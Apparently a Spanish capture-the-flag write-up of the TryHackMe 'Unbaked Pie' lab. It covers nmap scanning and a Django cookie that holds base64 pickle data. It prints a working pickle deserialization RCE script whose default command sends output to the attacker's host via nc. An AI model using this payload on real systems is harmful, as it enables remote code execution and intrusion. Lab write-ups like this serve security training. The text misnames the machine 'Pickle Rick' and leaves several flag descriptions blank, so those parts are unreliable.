---
title: "Unbaked Pie - Try Hack Me"
layout: single
excerpt:
show_date: true
classes: wide
header:
  teaser: "https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/data/pie.png?raw=true"
  teaser_home_page: true
  icon: "assets/images/icons/TryHackMe.png"
categories:
  - Writeup
  - TryHackMe
tags:
  - Pivot
  - Python
  - Pickle
  - Django
---

<p align="center">
<img src="">
</p>

La máquina **Pickle Rick** es una máquina virtual vulnerable de la plataforma **Try Hack Me** con un nivel de dificultad **Medium**  desarrollada por **tryhackme** y publicada **10 de marzo del 2019** con un sistema operativo **Linux**.

# Port Scan

  Para empezar, hice un escaneo con la herramienta **Nmap** para encontrar los puertos abiertos disponibles en la máquina con **[Ip:10.10.189.24]** utilizando los parámetros:

  - **-p-:**    Escaneo a toda la gama de puertos (65536).
  - **-Pn:**     .
  - **--min-rate 5000:** .
  - **-sS:**
  - **--open:** Muestra sólo los puertos con un estatus abierto.
  - **-oG:**    Guarda la el output en formato Grepeable.

  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/scan/scanPort.png?raw=true">
  </p>


  Una vez que hicimos el escaneo de puertos con la herramienta **ExtractPort**, vemos que los puertos que destacaron en este caso fueron **5003**:  

  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/scan/Ports.png?raw=true">
  </p>


  Una vez identificados los puertos abiertos, realizaremos un escaneo de versiones y servicios de estos puertos con la herramienta nmap configurando los siguientes parámetros:

  - **-sC:** Script de enumeración básica de sondeo en puertos y servicios alojados.
  - **-sV:** Detección de versiones en servicios alojados en puertos.
  - **-p :** Puertos a inspeccionar.
  - **-oN:** Formatos de Nmap en los que se guardará el archivo.

  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/scan/PortsServ.png?raw=true">
  </p>

  Realmente de este escaneo no logramos sacar mucha información así que como veo que en el resultado se alcanza a ver que tiene etiquetas en **html** entro via web a la ip para ver si tiene alguna servicio http montado.

  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/scan/web.png?raw=true">
  </p>

  Efectivamente tiene un servicio **http**, la herramienta de wappalyzer no muestra mucha información acerca de la web por eso intuyo que es un servicio web simple sin gestores de contenido.

  Investigando en la pagina vemos que podemos generar un error si entramos directamente a la url **"http://[IP]:5003/search"**

  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/scan/error.png?raw=true">
  </p>

  Entre toda la información se alcanza a ver que unas **cookies** se serializan con **pickle** en **base64**, la cookie es **search_cookie**.

  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/scan/cookie.png?raw=true">
  </p>

  Buscando como aprovecharnos sobre esto encontre el siguiente **(articulo)[https://davidhamann.de/2020/04/05/exploiting-python-pickle/]** que habla como usar python para serializar la data con pickle y enviarla mediante curl la data que serializamos.

  El codigo que podemos usar es el siguiente:

  ```python
  #!/usr/bin/python

  import cPickle
  import sys
  import base64

  DEFAULT_COMMAND = "whoami | nc [Your IP] [PORT]"
  COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

  class PickleRce(object):
      def __reduce__(self):
          import os
          return (os.system,(COMMAND,))

  print base64.b64encode(cPickle.dumps(PickleRce()))
  ```

  Este codigo ya es suficiente para poder conseguir un **RCE** en la maquina victima.

  <p align="center">
  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/scan/pickle.png?raw=true">
  </p>
